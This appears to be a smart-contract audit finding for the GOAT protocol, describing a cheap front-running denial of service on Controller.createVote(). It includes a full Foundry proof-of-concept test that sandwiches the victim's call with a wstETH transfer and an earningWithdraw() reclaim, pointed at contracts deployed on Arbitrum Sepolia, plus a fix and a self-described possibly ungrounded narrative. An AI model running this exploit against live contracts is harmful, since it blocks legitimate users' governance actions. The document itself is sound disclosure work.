---
id: 4726
severity: "High"
---

# A malicious user can prevent vote creation at almost no cost Submitted by b0g0

## Description

A staker in the GOAT protocol can raise a reputation challenge against any other staker. This happens by creating a vote, where the challenger (attacker) and the challenged (defender) are the 2 sides. The attacker locks wstETH in the Voting.sol contract proportional to the amount of the defender earnings he wants to freeze.

Vote creation happens through the Controller.createVote() function:
```solidity
function createVote(
    address defender_,
    uint dEthValue_,
    uint voterPercent_,
    uint freezeDuration_,
    uint minWstethA_,
    uint wstethA_
)
external
payable
{
    require(_isPausedAttack == 0, "paused");
    address attacker = msg.sender;
    // _weth.deposit{value: address(this).balance}();
    _prepareWsteth(minWstethA_, wstethA_);
    uint aEthValue = _geth.balanceOf(address(this));
    require(defender_ != address(_devTeam));
    require(dEthValue_ >= _minDefenderFund, "dEthValue_ too small");
    require(voterPercent_ <= _maxVoterPercent, "voterPercent_ too high");
    require(freezeDuration_ >= _minFreezeDuration && freezeDuration_ <= _maxFreezeDuration, "freezeDuration_ invalid");
    require(aEthValue <= dEthValue_ && aEthValue * LPercentage.DEMI / dEthValue_ >= _minAttackerFundRate, "aEthValue invalid");
    // ...
}
```

The following check is the one we should focus on, since it will be the one exploited:
```solidity
require(aEthValue <= dEthValue_ && aEthValue * LPercentage.DEMI / dEthValue_ >= _minAttackerFundRate, "aEthValue invalid");
```

It basically makes sure that the amount locked by the attacker is <= than the amount frozen on the defender. And the attacker amount is calculated based on the balances like so:
```solidity
uint aEthValue = _geth.balanceOf(address(this));
```

This makes it quite easy for an interested party to front-run the createVote() trx and transfer enough wstETH to the Controller contract , so that aEthValue > dEthValue_ , which will revert it.

What makes this exploit even less costly for the malicious actor is that he can sandwich createVote() with another transaction right after it and withdrawal the wstETH he transferred in the ﬁrst transaction. He can do this by calling Controller.earningWithdraw(), which unwraps the wstETH balances sitting in Controller and sends them to the caller:

• Controller.sol#L617
```solidity
function earningWithdraw(
    bool isEth_,
    uint amount_,
    address payable dest_,
    uint minEthA_
    // address[] memory pulledPoolOwners_
)
public
{
    //.....
    if (isEth_) {
        //....
        if (dest_ != address(this)) {
            LLido.allToEth(minEthA_); // <-- unwraps wstETH.balanceOf(address(this)) and sends it
            dest_.transfer(address(this).balance);
        }
    // ...
    }
}
```

As a result the cost of the attack for the exploiter is reduced only to the gas fees for the 2 transactions, which is nothing.

## Proof of Concept

Since the protocol has no tests, I created a Foundry Project and wrote fork tests using the contracts deployed on Arbitrum Sepolia. The used Sepolia RPC provider is a demo one (I actually used Alchemy).
```solidity
import "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;
interface IController {
    function ethStake(
        address payable poolOwner_,
        uint duration_,
        uint minSPercent_,
        uint poolConfigCode_,
        uint minWstethA_,
        uint wstethA_
    ) external payable;
    function dctStake(
        uint amount_,
        address payable poolOwner_,
        uint duration_
    ) external payable;
    function earningPulls(
        address account_,
        address[] memory poolOwners_,
        address bountyPullerTo_
    ) external;
    function lockWithdraw(
        bool isEth_,
        address payable poolOwner_,
        uint amount_,
        address payable dest_,
        bool isForced_,
        uint minEthA_
    ) external;
    function earningReinvest(
        bool isEth_,
        address payable poolOwner_,
        uint duration_,
        uint amount_,
        uint minSPercent_,
        uint poolConfigCode_
    ) external;
    function earningWithdraw(
        bool isEth_,
        uint amount_,
        address payable dest_,
        uint minEthA_
    ) external;
    function createVote(
        address defender_,
        uint dEthValue_,
        uint voterPercent_,
        uint freezeDuration_,
        uint minWstethA_,
        uint wstethA_
    ) external payable;
    function votingClaimFor(uint voteId_, address voter_) external;
    function earningWithdrawDevTeam() external;
    function claimRevenueShareDevTeam() external;
    function updateConfigs(uint[] memory values_) external;
}
interface IAccessControll {
    function approveAdmin(address admin_) external;
}
interface IVoting {
    struct SVoteBasicInfo {
        address attacker;
        address defender;
        uint aEthValue;
        uint dEthValue;
        uint voterPercent;
        uint aQuorum;
        uint startedAt;
        uint endAt;
        uint attackerPower;
        uint defenderPower;
        uint totalClaimed;
        bool isFinalized;
        bool isAttackerWon;
        uint winVal;
        uint winnerPower;
        bool isClosed;
    }
    function createVote(
        address attacker_,
        address defender_,
        uint aEthValue_,
        uint dEthValue_,
        uint voterPercent_,
        uint aQuorum_,
        uint startedAt_,
        uint endAt_
    ) external;
    function getVote(
        uint voteId_
    ) external view returns (SVoteBasicInfo memory);
    function claimFor(uint voteId_, address voter_) external;
    function defenderEarningFreezedOf(
        address account_
    ) external view returns (uint);
}
interface IEarning {
    function initEarning(
        address token_,
        address profileCAddr_,
        address accessControl_,
        string memory name_,
        string memory symbol_
    ) external;
    function updateMaxEarning(address account_, uint maxEarning_) external;
    function shareCommission(address account_) external;
    function update(address account_, bool needShareComm_) external;
    function withdraw(address account_, uint amount_, address dest_) external;
    function earningOf(address account_) external view returns (uint);
    function maxEarningOf(address account_) external view returns (uint);
}
contract TestContract is Test {
    uint256 chainFork;
    //contracts
    IController controller = IController(0xB4E5f0B2885F09Fd5a078D86E94E5D2E4b8530a7);
    IAccessControll dst_locker = IAccessControll(0x1033d5f886aef22fFADebf5f8c34088030Bb80f3);
    IVoting voting = IVoting(0x896604b21C6e9CbCE82e096266DCb5798cDDA67B);
    IEarning eEarning = IEarning(0xf7a08a0728C583075852Be8B67E47DceB5c71d48);
    //tokens
    IERC20 dP2PDToken = IERC20(0x72835409B8B49d83D8A710e67c906aE313D22860);
    IERC20 GOAT = IERC20(0x5Bfe38c9f309AED44DAa035abf69C80786355136);
    IERC20 WSTETH = IERC20(0x89840d36C96067DE8bd311d73802e3BC80877c2F);
    function setUp() public {
        // this is a free RPC endpoint, change it if not working
        chainFork = vm.createFork("https://sepolia-rollup.arbitrum.io/rpc");
    }
    function test_front_run_vote(uint256 amount) public {
        vm.selectFork(chainFork);
        address alice = address(100);
        address bob = address(150);
        deal(address(GOAT), alice, 100 ether);
        deal(address(GOAT), bob, 100 ether);
        // add 10 wstEth earnings for Bob
        deal(address(WSTETH), address(eEarning), 10806344879586039781);
        eEarning.update(bob, false);
        assertEq(eEarning.earningOf(bob), 10 ether);
        //add some wstEth balances to Bob & Alice
        deal(address(WSTETH), alice, 10 ether);
        deal(address(WSTETH), bob, 10 ether);
        vm.startPrank(alice);
        GOAT.approve(address(controller), 100 ether);
        WSTETH.approve(address(controller), 10 ether);
        vm.stopPrank();
        // create a snapshot of the state before the reputation challenge
        uint256 snapshot = vm.snapshot();
        // CASE-1 -> Alice Reputation Challenge Succeeds
        // Alice Opens Reputation Challenge against Bob
        vm.prank(alice);
        controller.createVote(bob, 8 ether, 1_000, 5 days, 0, 5 ether);
        // Alice has locked 5 ether
        assertEq(WSTETH.balanceOf(alice), 5 ether);
        // 8 ether of Bob earnings were locked
        assertEq(voting.defenderEarningFreezedOf(bob), 8 ether);
        // go back to snapshot and and reset state
        vm.revertTo(snapshot);
        // CASE-2 -> Bob front-runs Alice and reverts Reputation Challenge
        // state is reset
        assertEq(voting.defenderEarningFreezedOf(bob), 0);
        assertEq(WSTETH.balanceOf(alice), 10 ether);
        assertEq(eEarning.earningOf(bob), 10 ether);
        // Bob send enough wstETH to Controller and triggers validation failure
        vm.prank(bob);
        WSTETH.transfer(address(controller), 3 ether + 1 wei);
        // Alice Fails to create Reputation Challenge against Bob
        vm.prank(alice);
        vm.expectRevert("aEthValue invalid");
        controller.createVote(bob, 8 ether, 1_000, 5 days, 0, 5 ether);
        // Bob takes back his ETH
        vm.prank(bob);
        assertEq(bob.balance, 0);
        controller.earningWithdraw(true, 0, payable(bob), 0);
        // Bob gets unwrapped wstETH
        assertGe(bob.balance, 3 ether + 1 wei);
        // Bob has the other wstETH
        assertEq(WSTETH.balanceOf(bob), 10 ether - 3 ether - 1 wei);
    }
}
```

## Recommendation

* Make aEthValue a parameter that is passed by the user and use it in the exploited check:
```solidity
function createVote(
    address defender_,
    uint dEthValue_,
    uint aEthValue, // <----- provided by user
    uint voterPercent_,
    uint freezeDuration_,
    uint minWstethA_,
    uint wstethA_
) external payable {
    // ...
    // this cannot be influenced by direct transfers
    require(aEthValue <= dEthValue_ && aEthValue * LPercentage.DEMI / dEthValue_ >= _minAttackerFundRate, "aEthValue invalid");
}
```
The transferFrom will fail in case the user did not provided the appropriate amount.

## Derived Narrative

The following field is derived content and may not be source-grounded:

A malicious staker can prevent the creation of a reputation challenge vote in the GOAT protocol by exploiting the way the contract determines the amount of wstETH that the attacker has locked. The vulnerability originates from a check that reads the contract's current wstETH balance (aEthValue) directly from storage and compares it with the defender's earnings that the challenger wants to freeze (dEthValue). Because the balance is taken from the contract address itself, an attacker can front‑run the createVote transaction, send a small amount of wstETH to the Controller contract so that the observed aEthValue becomes larger than the defender's dEthValue, and cause the require statement to revert. After the revert the attacker immediately calls the earningWithdraw function, which unwraps the temporarily deposited wstETH and transfers it back to the attacker, leaving only the gas cost of two transactions. From a user’s perspective the attempt to create a vote fails with the error message "aEthValue invalid", no vote is recorded, and the expected frozen earnings on the defender never appear. The impact is a denial‑of‑service on the reputation‑challenge mechanism: legitimate stakers are unable to challenge other stakers, the protocol’s governance and trust model are weakened, and the attacker can disrupt the normal accounting of frozen earnings without spending any significant funds. The condition for exploitation is that the attacker can send wstETH to the Controller contract in the same block (or just before) the victim’s createVote call and then withdraw it immediately afterwards. All stakers who rely on the ability to open a vote are affected, as are any downstream contracts that assume the challenge will be created. The issue was discovered during a manual audit and reproduced with a Foundry fork test that simulated the front‑run and withdrawal sequence. It is hard to notice because the revert looks like a normal validation failure, yet the underlying cause is an external balance manipulation that is not part of the contract’s internal state logic. The recommended mitigation is to stop deriving aEthValue from the contract’s balance. Instead, the attacker’s locked amount should be supplied as an explicit function argument that is validated against the amount transferred via a safe transferFrom call, or the contract should lock the required wstETH before performing the check, ensuring that external balance changes cannot influence the validation. By making the locked amount immutable to external transfers, the protocol regains its intended accounting guarantees and prevents the cheap denial‑of‑service attack.
